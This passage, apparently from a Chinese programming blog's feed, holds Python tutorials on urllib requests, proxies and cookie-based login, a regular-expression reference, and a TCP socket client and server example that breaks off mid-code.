class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">url = &apos;https://www.baidu.com/s?&apos;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;:&apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">keyword = input(&quot;请输入需要查询的关键字： &quot;)</span><br><span class="line">wd = &#123;&quot;wd&quot; : keyword&#125;</span><br><span class="line"># 通过urllib.parse.urlencode()将中文进行urlencode编码,参数是一个dict类型</span><br><span class="line">url += urllib.parse.urlencode(wd)</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url,headers=headers)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">html = response.read().decode(&apos;utf8&apos;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h3 id="代理-HTTPSHandler"><a href="#代理-HTTPSHandler" class="headerlink" title="代理 HTTPSHandler"></a>代理 HTTPSHandler</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">url = &apos;https://www.baidu.com/&apos;</span><br><span class="line"></span><br><span class="line">#构建一个Handler处理对象</span><br><span class="line">http_handler = urllib.request.HTTPHandler()</span><br><span class="line">https_handler = urllib.request.HTTPSHandler()</span><br><span class="line"></span><br><span class="line">#调用build_opener()方法构建一个自定义的opener对象，参数是构建的Handler处理对象</span><br><span class="line">opener = urllib.request.build_opener(http_handler)</span><br><span class="line">openers = urllib.request.build_opener(https_handler)</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url)</span><br><span class="line">response = openers.open(request)</span><br><span class="line"></span><br><span class="line">html = response.read().decode(&apos;utf8&apos;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h3 id="代理-ProxyHandler"><a href="#代理-ProxyHandler" class="headerlink" title="代理 ProxyHandler"></a>代理 ProxyHandler</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">url = &apos;https://webing.io/&apos;</span><br><span class="line"></span><br><span class="line">#代理开关</span><br><span class="line">proxy = True</span><br><span class="line"></span><br><span class="line"># 构建一个Handler处理器对象，参数是一个字典类型，包括代理类型和代理服务器IP+PROT</span><br><span class="line">httpproxy_handler = urllib.request.ProxyHandler(&#123;&quot;http&quot; : &quot;118.190.95.43:9001&quot;&#125;)</span><br><span class="line">#密码验证方式</span><br><span class="line">httpproxy_handler = urllib.request.ProxyHandler(&#123;&quot;http&quot; : &quot;admin:admin@118.190.95.43:9001&quot;&#125;)</span><br><span class="line"></span><br><span class="line"># 构建了一个没有代理的处理器对象</span><br><span class="line">nullproxy_handler = urllib.request.ProxyHandler(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">if proxy:</span><br><span class="line">    opener = urllib.request.build_opener(httpproxy_handler)</span><br><span class="line">else:</span><br><span class="line">    opener = urllib.request.build_opener(nullproxy_handler)</span><br><span class="line"></span><br><span class="line"># 构建了一个全局的opener，之后所有的请求都可以用urlopen()方式去发送，也附带Handler的功能</span><br><span class="line">urllib.request.install_opener(opener)</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"></span><br><span class="line">html = response.read().decode(&apos;utf8&apos;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h3 id="登录-http-cookiejar"><a href="#登录-http-cookiejar" class="headerlink" title="登录 http.cookiejar"></a>登录 http.cookiejar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line">import http.cookiejar</span><br><span class="line"></span><br><span class="line"># 通过CookieJar()类构建一个cookieJar()对象，用来保存cookie的值</span><br><span class="line">cookie = http.cookiejar.CookieJar()</span><br><span class="line"></span><br><span class="line"># 通过HTTPCookieProcessor()处理器类构建一个处理器对象，用来处理cookie</span><br><span class="line"># 参数就是构建的CookieJar()对象</span><br><span class="line">cookie_handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line"></span><br><span class="line"># 构建一个自定义的opener</span><br><span class="line">opener = urllib.request.build_opener(cookie_handler)</span><br><span class="line"></span><br><span class="line"># 通过自定义opener的addheaders的参数，可以添加HTTP报头参数</span><br><span class="line">opener.addheaders = [(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 LBBROWSER&quot;)]</span><br><span class="line"></span><br><span class="line"># WordPress网的登录接口</span><br><span class="line">url = &quot;http://localhost/wp-login.php&quot;</span><br><span class="line"></span><br><span class="line"># 需要登录的账户密码</span><br><span class="line">data = &#123;</span><br><span class="line">&apos;log&apos;:&apos;admin&apos;,</span><br><span class="line">&apos;pwd&apos;:&apos;admin&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 通过urlencode()编码转换</span><br><span class="line">data = urllib.parse.urlencode(data).encode()</span><br><span class="line"></span><br><span class="line"># 第一次是post请求，发送登录需要的参数，获取cookie</span><br><span class="line">request = urllib.request.Request(url, data = data)</span><br><span class="line"></span><br><span class="line"># 发送第一次的post请求，生成登录后的cookie(如果登录成功的话)</span><br><span class="line">response = opener.open(request)</span><br><span class="line">#python3不支持直接读取网页内容，提示cookie被禁用，取返回的url，再打开网页</span><br><span class="line">cookie_url = response.read().decode()</span><br><span class="line">print(cookie_url)</span><br></pre></td></tr></table></figure><p>该登录测试失败：Cookies被阻止或者您的浏览器不支持，人人网可以。</p><p>经测试，WordPress登录失败的原因是data的问题。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 正则表达式</title>
      <link href="/article/python-re.html"/>
      <url>/article/python-re.html</url>
      
        <content type="html"><![CDATA[<h3 id="表示字符"><a href="#表示字符" class="headerlink" title="表示字符"></a>表示字符</h3><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.</td><td align="left">匹配任意1个字符（除了\n）</td></tr><tr><td align="left">[ ]</td><td align="left">匹配[ ]中列举的字符</td></tr><tr><td align="left">\d</td><td align="left">匹配数字，即0-9</td></tr><tr><td align="left">\D</td><td align="left">匹配非数字</td></tr><tr><td align="left">\s</td><td align="left">匹配空白字符，即空格，tab键等空白的字符</td></tr><tr><td align="left">\S</td><td align="left">匹配非空白字符</td></tr><tr><td align="left">\w</td><td align="left">匹配单词字符，即a-z、A-Z、0-9、_</td></tr><tr><td align="left">\W</td><td align="left">匹配非单词字符</td></tr></tbody></table><h3 id="表示数量"><a href="#表示数量" class="headerlink" title="表示数量"></a>表示数量</h3><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">匹配前一个字符出现0次或者无限次，即可有可无</td></tr><tr><td align="left">+</td><td align="left">匹配前一个字符出现1次或者无限次，即至少有1次</td></tr><tr><td align="left">?</td><td align="left">匹配前一个字符出现1次或者0次，即要么有1次，要么没有</td></tr><tr><td align="left">{m}</td><td align="left">匹配前一个字符出现m次</td></tr><tr><td align="left">{m,}</td><td align="left">匹配前一个字符至少出现m次</td></tr><tr><td align="left">{m,n}</td><td align="left">匹配前一个字符出现从m到n次</td></tr></tbody></table><h3 id="表示边界"><a href="#表示边界" class="headerlink" title="表示边界"></a>表示边界</h3><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">^</td><td align="left">匹配字符串开头，表示以什么字符开头</td></tr><tr><td align="left">$</td><td align="left">匹配字符串结尾，表示以什么字符结尾</td></tr><tr><td align="left">\b</td><td align="left">匹配一个单词的边界</td></tr><tr><td align="left">\B</td><td align="left">匹配非单词边界</td></tr></tbody></table><h3 id="匹配分组"><a href="#匹配分组" class="headerlink" title="匹配分组"></a>匹配分组</h3><table><thead><tr><th align="left">命令</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">管道符号</td><td align="left">匹配左右任意一个表达式,去掉单引号</td></tr><tr><td align="left">(ab)</td><td align="left">将括号中字符作为一个分组</td></tr><tr><td align="left">\num</td><td align="left">引用分组num匹配到的字符串</td></tr><tr><td align="left">(?P<name>)</name></td><td align="left">分组起别名</td></tr><tr><td align="left">(?P=name)</td><td align="left">引用别名为name分组匹配到的字符串</td></tr></tbody></table><ul><li>match 方法：从起始位置开始查找，一次匹配</li><li>search 方法：从任何位置开始查找，一次匹配</li><li>findall 方法：全部匹配，返回列表</li><li>finditer 方法：全部匹配，返回迭代器</li><li>split 方法：分割字符串，返回列表</li><li>sub 方法：替换</li></ul><h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(&apos;re.match是用来进行正则匹配检查的方法，从左到右匹配。若字符串匹配正则表达式，则match方法返回匹配对象（Match Object），否则返回None。&apos;)</span><br><span class="line">print(&apos;匹配对象Macth Object具有group方法，用来返回字符串的匹配部分。&apos;)</span><br><span class="line"></span><br><span class="line"># 使用match方法进行匹配操作</span><br><span class="line">result = re.match(正则表达式,要匹配的字符串)</span><br><span class="line"># 如果上一步匹配到数据的话，可以使用group方法来提取数据</span><br><span class="line">result.group()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.match(&apos;&lt;h1&gt;(.*)&lt;/h1&gt;&lt;h2&gt;(.*)&lt;/h2&gt;&apos;,&apos;&lt;h1&gt;要匹配的第一个字符串&lt;/h1&gt;&lt;h2&gt;要匹配的第二个字符串&lt;/h2&gt;&apos;)</span><br><span class="line">print(&apos;这是匹配的第一个括号内的字符：&apos;,result.group(1))</span><br><span class="line">print(&apos;这是匹配的第二个括号内的字符：&apos;,result.group(2))</span><br><span class="line">print(&apos;这是匹配的所有字符：&apos;,result.groups())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.compile(&apos;&lt;h1&gt;(.*)&lt;/h1&gt;&lt;h2&gt;(.*)&lt;/h2&gt;&apos;)</span><br><span class="line">cent = result.match(&apos;&lt;h1&gt;要匹配的第一个字符串&lt;/h1&gt;&lt;h2&gt;要匹配的第二个字符串&lt;/h2&gt;&apos;)</span><br><span class="line">print(&apos;这是匹配的所有字符：&apos;,cent.group())</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; (&apos;要匹配的第一个字符串&apos;, &apos;要匹配的第二个字符串&apos;)</span><br></pre></td></tr></table></figure><h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">ret = re.search(r&quot;\d+&quot;, &quot;阅读次数为：9999 关闭网页次数：5 浏览完毕：88&quot;)</span><br><span class="line">print(&apos;我从左到右匹配，只要匹配到就结束，后面的不匹配。&apos;,ret.group())</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 9999</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.compile(&apos;\d+&apos;)</span><br><span class="line">cent = result.search(&apos;阅读次数为：9999 关闭网页次数：5 浏览完毕：88&apos;)</span><br><span class="line">print(&apos;我从左到右匹配，只要匹配到就结束，后面的不匹配：&apos;,cent.group())</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 999</span><br></pre></td></tr></table></figure><h3 id="findall"><a href="#findall" class="headerlink" title="findall"></a>findall</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">ret = re.findall(r&quot;\d+&quot;, &quot;阅读次数为：9999 关闭网页次数：5 浏览完毕：88&quot;)</span><br><span class="line">print(&apos;我就不一样，我从左到右匹配，有多少我就匹配多少。&apos;,ret)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [&apos;9999&apos;, &apos;5&apos;, &apos;88&apos;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.compile(&apos;\d+&apos;)</span><br><span class="line">cent = result.findall(&apos;阅读次数为：9999 关闭网页次数：5 浏览完毕：88&apos;)</span><br><span class="line">print(&apos;我就不一样，我从左到右匹配，有多少我就匹配多少：&apos;,cent)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [&apos;9999&apos;, &apos;5&apos;, &apos;88&apos;]</span><br></pre></td></tr></table></figure><h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">ret = re.sub(r&quot;\d+&quot;, &apos;5W&apos;, &quot;chijiba.com = 50000,webing.io = 50000&quot;)</span><br><span class="line">print(&apos;我将匹配到的数据进行替换成：&apos;,ret)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; chijiba.com = 5W,webing.io = 5W</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">def sub(ret):</span><br><span class="line">    num = int(ret.group()) + 10000</span><br><span class="line">    return str(num)</span><br><span class="line"></span><br><span class="line">ret = re.sub(r&quot;\d+&quot;, sub, &quot;chijiba.com = 50000,webing.io = 50000&quot;)</span><br><span class="line">print(&apos;我将匹配到的数据进行替换成：&apos;,ret)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; chijiba.com = 60000,webing.io = 60000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.compile(&apos;\d+&apos;)</span><br><span class="line">cent = result.sub(&apos;20180224&apos;,&apos;site:webing.io 2018&apos;)</span><br><span class="line">print(&apos;我将匹配到的数据进行替换成：&apos;,cent)</span><br></pre></td></tr></table></figure><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(&apos;根据匹配进行切割字符串，并返回一个列表&apos;)</span><br><span class="line">ret = re.split(r&quot;:| &quot;,&quot;site:webing.io 2018&quot;)</span><br><span class="line">print(ret)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [&apos;site&apos;, &apos;webing.io&apos;, &apos;2018&apos;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">result = re.compile(&apos;:| &apos;)</span><br><span class="line">cent = result.split(&apos;site:webing.io 2018&apos;)</span><br><span class="line">print(&apos;我根据匹配进行切割字符串，并返回一个列表：&apos;,cent)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [&apos;site&apos;, &apos;webing.io&apos;, &apos;2018&apos;]</span><br></pre></td></tr></table></figure><h3 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">print(&apos;贪婪模式，总是尝试匹配尽可能多的字符&apos;)</span><br><span class="line">print(&apos;非贪婪则相反，总是尝试匹配尽可能少的字符&apos;)</span><br><span class="line">print(&apos;在&quot;*&quot;,&quot;?&quot;,&quot;+&quot;,&quot;&#123;m,n&#125;&quot;后面加上？，使贪婪变成非贪婪。&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&quot;aa(\d+)&quot;,&quot;aa2343ddd&quot;).group(1)</span><br><span class="line">&apos;2343&apos;</span><br><span class="line">&gt;&gt;&gt; re.match(r&quot;aa(\d+?)&quot;,&quot;aa2343ddd&quot;).group(1)</span><br><span class="line">&apos;2&apos;</span><br><span class="line">&gt;&gt;&gt; re.match(r&quot;aa(\d+)ddd&quot;,&quot;aa2343ddd&quot;).group(1) </span><br><span class="line">&apos;2343&apos;</span><br><span class="line">&gt;&gt;&gt; re.match(r&quot;aa(\d+?)ddd&quot;,&quot;aa2343ddd&quot;).group(1)</span><br><span class="line">&apos;2343&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">baidu_urls = &apos;&apos;&apos;</span><br><span class="line">https://webing.io/article/test-name-login.html</span><br><span class="line">https://webing.io/article/python-re.html</span><br><span class="line">https://webing.io/article/test-login-wordpress.html</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">news = re.sub(r&quot;(https://.+?/).*&quot;, lambda x: x.group(1), baidu_urls)</span><br><span class="line">print(&apos;加问号关闭贪婪模式，只匹配到第一个斜杠：&apos;,news)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Socket套接字-TCP</title>
      <link href="/article/python-socket-tcp.html"/>
      <url>/article/python-socket-tcp.html</url>
      
        <content type="html"><![CDATA[<p>Python网络编程相关主要模块主要支持两种协议：TCP及UDP协议。<br>与Internet进行通信，程序必须使用套接字Socket的对象。<br>Python里边可以使用Socket模块来支持套接字。</p><h3 id="Socket-套接字："><a href="#Socket-套接字：" class="headerlink" title="Socket 套接字："></a>Socket 套接字：</h3><p>socket(方式，协议)</p><h4 id="AF-INET"><a href="#AF-INET" class="headerlink" title="AF_INET"></a>AF_INET</h4><p>对于TCP/IP协议的TCP和UDP通信。</p><p>TCP 采用：SOCK_STREAM UDP采用：SOCK_DGRAM</p><h4 id="AF-UNIX"><a href="#AF-UNIX" class="headerlink" title="AF_UNIX"></a>AF_UNIX</h4><p>用于同一台机器上的进程间通信。</p><h3 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h3><p><img src="../do/images/basis/socket-send.png" alt></p><h3 id="创建服务器"><a href="#创建服务器" class="headerlink" title="创建服务器"></a>创建服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">print(&apos;创建套接字，采用TCP协议&apos;)</span><br><span class="line">serversocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">print(&apos;绑定端口和IP&apos;)</span><br><span class="line">serversocket.bind((&quot;&quot;, 1024))</span><br><span class="line"></span><br><span class="line">print(&apos;建立监听，使用socket创建的套接字默认的属性是主动的，使用listen将其变为被动的，这样就可以接收别人的连接了，最多同时5个连接&apos;)</span><br><span class="line">serversocket.listen(5)</span><br><span class="line"></span><br><span class="line">print(&apos;现在在等待新的客户端来服务器，服务器产生一个新的套接字专门为这个客户端服务，返回的数据包为：元组(创建新的套接字(客户端)，客户端的IP地址和端口号)&apos;)</span><br><span class="line">clientSocket,clientInfo = serversocket.accept()</span><br><span class="line"></span><br><span class="line">print(&apos;新的套接字已经创建完成，正在等待客户端发送的数据。&apos;)</span><br><span class="line">recvData = clientSocket.recv(1024)</span><br><span class="line"></span><br><span class="line">print(&apos;接收到来自客户端的数据：%s:%s&apos; % (str(clientInfo), recvData))</span><br><span class="line"></span><br><span class="line">print(&apos;关闭来自客户端的套接字。&apos;)</span><br><span class="line">clientSocket.close()</span><br><span class="line"></span><br><span class="line">print(&apos;关闭程序的套接字。&apos;)</span><br><span class="line">serversocket.close()</span><br></pre></td></tr></table></figure><h3 id="创建客户端"><a href="#创建客户端" class="headerlink" title="创建客户端"></a>创建客户端</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">print(&apos;创建套接字，采用TCP协议&apos;)</span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">print(&apos;连接到服务器&apos;)</span><br><span class="line">clientSocket.connect((&apos;192.168.123.100&apos;, 1024))</span><br><span class="line"></span><br><span class="line">clientSocket.send(&apos;TCP客户端已经链接好了服务器，所以在以后的数据发送中，不需要填写对方的IP和端口。&apos;.encode(&apos;gb2312&apos;))</span><br><span class="line">clientSocket.send(&apos;UDP客户端在发送数据的时候，因为没有之前的连接，所依每次发送数据都要填写接收方的端口和IP&apos;.encode(&apos;gb2312&apos;))</span><br><span class="line"></span><br><span class="line">recvData = clientSocket.recv(1024)</span><br><span class="line">print(&quot;还可以接收来自服务器的数据：%s&quot; % recvData)</span><br><span class="line"></span><br><span class="line">print(&apos;关闭连接&apos;)</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h6 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">clientSocket.connect((&apos;192.168.123.100&apos;, 1024))</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    sendData = input(&apos;请输入信息：&apos;)</span><br><span class="line">    if len(sendData) &gt; 0:</span><br><span class="line">        clientSocket.send(sendData.encode())</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">    recvData = clientSocket.recv(1024)</span><br><span class="line">    print(&quot;接收来自服务器的消息：%s&quot; % recvData)</span><br><span class="line"></span><br><span class="line">print(&apos;关闭连接&apos;)</span><br><span class="line">clientSocket.close()</span><br></pre></td></tr></table></figure><h6 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">serversocket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">serversocket.bind((&quot;&quot;, 1024))</span><br><span class="line">serversocket.listen(5)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    clientSocket,clientInfo = serversocket.accept()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        recvData = clientSocket.recv(1024)</span><br><span class="line">        #如果接收的数据的长度为0，则意味着客户端关闭了链接</span><br><span class="line">        if len(recvData) &gt; 0:</span><br><span class="line">            print(&apos;接收到来自客户端的数据：%s:%s&apos; % (str(clientInfo), recvData))</span><br><span class="line">        else:</span><br><span 